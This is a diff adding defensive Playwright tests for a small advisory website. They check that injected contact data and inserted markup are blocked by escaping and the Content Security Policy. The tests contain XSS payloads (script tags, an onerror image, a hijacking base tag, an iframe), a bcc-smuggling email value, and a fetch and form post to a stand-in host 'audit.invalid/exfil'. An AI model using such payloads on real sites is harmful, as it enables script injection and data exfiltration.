@@ -89,6 +89,65 @@ test('verified contact configuration creates correct call and meeting email link
   await page.close();
 });
 
+test('malicious contact configuration cannot add email recipients or execute display markup', async () => {
+  const page = await browser.newPage();
+  await page.route('**/contact.json', (route) => route.fulfill({ json: {
+    phone: '+64 00 000 0000',
+    phoneDisplay: '<img src=x onerror="globalThis.sjaInjected=true">',
+    email: 'sue@example.com?bcc=audit%40example.net&x='
+  } }));
+  await page.goto(base, { waitUntil: 'networkidle' });
+  assert.equal(await page.locator('.hero-actions a[data-method="email"]').getAttribute('href'), '#contact');
+  assert.equal(await page.locator('#email-link').getAttribute('href'), null);
+  assert.equal(await page.locator('[data-phone-display] img').count(), 0);
+  assert.match(await page.locator('[data-phone-display]').innerText(), /<img src=x/);
+  assert.equal(await page.evaluate(() => globalThis.sjaInjected), undefined);
+  await page.locator('[data-goal="Buying my first home"]').click();
+  assert.equal(await page.locator('#email-link').isVisible(), false);
+  assert.equal(await page.locator('#call-link').isVisible(), true);
+  await page.close();
+});
+
+test('exported CSP permits the demo but blocks injected scripts, handlers, external resources and form submission', async () => {
+  const page = await browser.newPage();
+  const html = readFileSync(new URL('../.pages/index.html', import.meta.url), 'utf8');
+  const attack = '<base href="https://audit.invalid/">'
+    + '<script>globalThis.sjaInjected=true</script>'
+    + '<img src="https://audit.invalid/pixel" onerror="globalThis.sjaHandler=true">'
+    + '<iframe src="https://audit.invalid/frame"></iframe>'
+    + '<form id="attack-form" action="https://audit.invalid/submit" method="post"><button>Audit submission</button></form>';
+  const url = `${base}/security-export`;
+  let externalRequests = 0;
+  await page.route('https://audit.invalid/**', (route) => { externalRequests++; return route.abort(); });
+  await page.route(url, (route) => route.fulfill({ contentType: 'text/html', body: html.replace('</body>', () => `${attack}</body>`) }));
+  await page.addInitScript(() => {
+    globalThis.sjaViolations = [];
+    document.addEventListener('securitypolicyviolation', (event) => { globalThis.sjaViolations.push(event.effectiveDirective); });
+  });
+  await page.goto(url, { waitUntil: 'networkidle' });
+  await page.waitForFunction(() => document.querySelector('.hero-actions a[data-method="phone"]').getAttribute('href') === 'tel:+64276187878');
+  assert.equal(await page.evaluate(() => globalThis.sjaInjected), undefined);
+  assert.equal(await page.evaluate(() => globalThis.sjaHandler), undefined);
+  assert.equal(await page.evaluate(() => document.baseURI), url);
+  await page.getByRole('button', { name: /Let’s talk/ }).click();
+  assert.equal(await page.locator('#contact-dialog').evaluate((element) => element.open), true);
+  assert.equal(await page.locator('.brand-logo').first().evaluate((image) => image.complete && image.naturalWidth === 1800), true);
+  await page.keyboard.press('Escape');
+  await page.evaluate(async () => { try { await fetch('https://audit.invalid/exfil'); } catch { /* Expected CSP rejection. */ } });
+  await page.waitForFunction(() => globalThis.sjaViolations.includes('connect-src'));
+  // A CSP-blocked navigation never completes; requestSubmit exercises the same
+  // browser submission check without Playwright waiting for that navigation.
+  await page.evaluate(() => document.querySelector('#attack-form').requestSubmit());
+  await page.waitForFunction(() => globalThis.sjaViolations.includes('form-action'));
+  const violations = await page.evaluate(() => globalThis.sjaViolations);
+  for (const directive of ['script-src-elem', 'script-src-attr', 'img-src', 'frame-src', 'base-uri', 'form-action', 'connect-src']) {
+    assert.ok(violations.includes(directive), `No enforcement observed for ${directive}`);
+  }
+  assert.equal(externalRequests, 0);
+  assert.equal(page.url(), url);
+  await page.close();
+});
+
 test('FAQs expand, digital explanation opens, review routes and links resolve', async () => {
   const page = await browser.newPage();
   await page.goto(base);
